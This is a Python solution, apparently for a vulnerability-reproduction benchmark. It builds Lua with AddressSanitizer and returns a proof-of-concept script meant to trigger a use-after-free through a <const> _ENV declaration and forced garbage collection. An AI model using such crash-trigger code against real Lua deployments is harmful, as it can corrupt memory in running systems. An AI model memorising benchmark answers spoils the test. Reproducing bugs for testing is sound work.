import os
import tarfile
import tempfile
import subprocess
import hashlib

class Solution:
    def solve(self, src_path: str) -> bytes:
        # Extract the tarball
        with tarfile.open(src_path, 'r') as tar:
            temp_dir = tempfile.mkdtemp()
            tar.extractall(temp_dir)
        
        # Find the Lua source directory
        lua_dir = None
        for root, dirs, files in os.walk(temp_dir):
            if 'Makefile' in files or 'lua.c' in files:
                lua_dir = root
                break
        
        if not lua_dir:
            raise ValueError("Could not find Lua source directory")
        
        # Build Lua
        build_dir = tempfile.mkdtemp()
        os.chdir(lua_dir)
        
        # Try to compile with ASan if possible
        env = os.environ.copy()
        env['CC'] = 'gcc'
        cflags = '-fsanitize=address -fno-omit-frame-pointer -g'
        
        # First clean and build
        subprocess.run(['make', 'clean'], capture_output=True)
        result = subprocess.run(['make', 'MYCFLAGS=' + cflags, 'MYLDFLAGS=-fsanitize=address'],
                              capture_output=True, text=True, env=env)
        
        if result.returncode != 0:
            # Try without ASan
            subprocess.run(['make', 'clean'], capture_output=True)
            result = subprocess.run(['make'], capture_output=True, text=True)
            if result.returncode != 0:
                raise RuntimeError("Failed to build Lua")
        
        lua_path = os.path.join(lua_dir, 'src', 'lua')
        if not os.path.exists(lua_path):
            # Try alternative path
            lua_path = os.path.join(lua_dir, 'lua')
        
        # Generate PoC based on known vulnerability pattern
        # The vulnerability is in Lua 5.4 when _ENV is declared as <const>
        # This creates incorrect bytecode that can lead to use-after-free
        poc = b"""local function f()
  local _ENV <const> = {x = 1}
  return function() return x end
end

local g = f()

-- Create multiple references to confuse the GC
local refs = {}
for i = 1, 100 do
  refs[i] = g
end

-- Force garbage collection to potentially free the _ENV table
collectgarbage("collect")

-- Access the function which may reference freed _ENV
-- Trigger the use-after-free
return g()
"""
        
        # Try to trigger the crash
        try:
            proc = subprocess.run([lua_path, '-e', poc.decode('utf-8', errors='ignore')],
                                capture_output=True, timeout=5)
        except subprocess.TimeoutExpired:
            pass
        
        # Cleanup
        os.chdir('/')
        
        return poc